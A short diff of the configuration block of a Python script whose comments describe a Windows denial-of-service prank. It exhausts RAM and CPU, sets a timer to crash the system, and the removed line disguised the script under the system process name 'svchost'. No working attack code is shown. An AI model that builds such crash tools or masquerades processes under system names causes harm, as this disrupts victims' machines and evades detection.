@@ -11,9 +11,9 @@ import win32api
 import win32clipboard
 
 # ---------------- CONFIGURATION (a.k.a. the Control Panel of Doom) ----------------
-SCRIPT_NAME = "svchost"  # Give it a boring name, like a spy in a trench coat
-RAM_TARGET_PERCENT = 99  # How hungry? 0–100%
-RAM_WORKER_CHUNK_MB = 200  # Size of each RAM goblin
+SCRIPT_NAME = "AgentsofHydra"  # Give it a boring name, like a spy in a trench coat
+RAM_TARGET_PERCENT = 90  # How hungry? 0–100%
+RAM_WORKER_CHUNK_MB = 100  # Size of each RAM goblin
 CPU_WORKERS = multiprocessing.cpu_count()  # Or set manually to go off-script
 CRASH_TIMER_MINUTES = 5  # How long until we hit "Bye, Windows!"
 ENABLE_LOGGING = True  # Chaos should be documented for legal reasons
